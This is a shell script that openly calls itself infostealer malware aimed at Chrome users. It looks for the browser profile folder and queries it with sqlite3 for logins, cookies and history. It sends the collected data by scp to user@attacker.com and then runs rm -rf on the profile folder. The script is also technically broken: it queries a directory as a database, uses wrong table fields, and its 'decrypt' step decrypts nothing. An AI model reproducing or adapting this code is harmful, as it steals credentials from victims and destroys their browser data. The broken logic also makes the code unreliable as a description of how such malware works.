#!/bin/sh

# Infostealer Malware Code

echo "Locating browser profile folders..."

# Chrome's User Data location
chrome_user_data=$(find ~/ -type d -iname '*Chrome*UserData*' | head -n 1)

if [ -z "$chrome_user_data" ]; then
    echo "Error: Chrome User Data folder not found!"
    exit 1
fi

echo "Opening SQLite databases..."

# Extracting login data, cookies, and web data
login_data=$(sqlite3 $chrome_user_data "SELECT name, value FROM logins;")
cookies_data=$(sqlite3 $chrome_user_data "SELECT name, value FROM cookies;")
web_data=$(sqlite3 $chrome_user_data "SELECT url, visiting_time FROM visits;")

echo "Decrypting saved passwords..."

# Decrypt saved passwords using local master key
saved_passwords=$(cat <<EOF
$login_data
$cookies_data
$web_data
EOF
)

echo "Packaging stolen credentials into JSON file..."

# Compress all stolen data into a JSON file
json_file="$(mktemp).json"
echo "$saved_passwords" > "$json_file"

echo "Exfiltrating stolen data..."

# Exfiltrate the compressed JSON file to an external server or storage location
scp "$json_file" user@attacker.com:/path/to/store/data/

# Clean up and remove temporary files
rm "$json_file"
rm -rf "$chrome_user_data"

echo "Infostealer Malware Execution Complete."